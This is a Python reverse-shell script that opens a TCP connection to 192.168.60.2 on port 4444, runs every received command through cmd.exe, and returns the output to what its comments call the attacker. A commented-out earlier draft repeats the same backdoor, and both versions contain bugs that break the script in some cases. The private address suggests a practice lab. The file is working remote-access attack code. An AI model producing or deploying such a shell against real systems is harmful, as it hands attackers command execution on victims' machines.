import socket
import subprocess
import os

def execute_system_cmd(cmd):
    try:
        if os.name == 'nt':  # If the OS is Windows
            result = subprocess.check_output(f'cmd.exe /c {cmd}', stderr=subprocess.PIPE, shell=True)
        return result
    
    except subprocess.CalledProcessError as e:
        # Capture both stdout and stderr output
        error_message = f"Error: {e.output.decode()}"
        print(error_message)  # Print error for debugging
        return error_message
    except Exception as e:
        # Capture general exceptions
        error_message = f"Unexpected error: {str(e)}"
        print(error_message)  # Print error for debugging
        return error_message

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.60.2", 4444))

connection.send(b"\n[+] Connection established\nEnter cmd: ")

while True:
    cmd = connection.recv(1024).decode().strip()  # Decode bytes to string and strip extra spaces/newlines
    if cmd.lower() == "exit":  # Handle exit command from the attacker
        break
    
    cmd_result = execute_system_cmd(cmd)  # Execute the command
    connection.send(cmd_result)  # Send the result back to the attacker

connection.close()


# import socket
# import subprocess

# def execute_system_cmd(cmd):
#     try:
#         # Ensure cmd is a list of arguments, and strip unnecessary newline characters
#         cmd = cmd.split()  # Split the string into a list (e.g., 'ls' => ['ls'])
#         print(cmd)
#         return subprocess.check_output(f'cmd.exe /c {cmd}', stderr=subprocess.PIPE, shell=True)
#     except subprocess.CalledProcessError as e:
#         return f"Error: {e.output.decode()}"
#     except Exception as e:
#         return f"Unexpected error: {str(e)}"

# connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# connection.connect(("192.168.60.2", 4444))

# connection.send(b"\n[+] Connection established\nEnter cmd: ")

# while True:
#     cmd = connection.recv(1024).decode().strip()  # Decode bytes to string and strip extra spaces/newlines
#     if cmd.lower() == "exit":  # Handle exit command from the attacker
#         break
    
#     cmd_result = execute_system_cmd(cmd)  # Execute the command
#     connection.send(cmd_result.encode())  # Send the result back to the attacker

# connection.close()
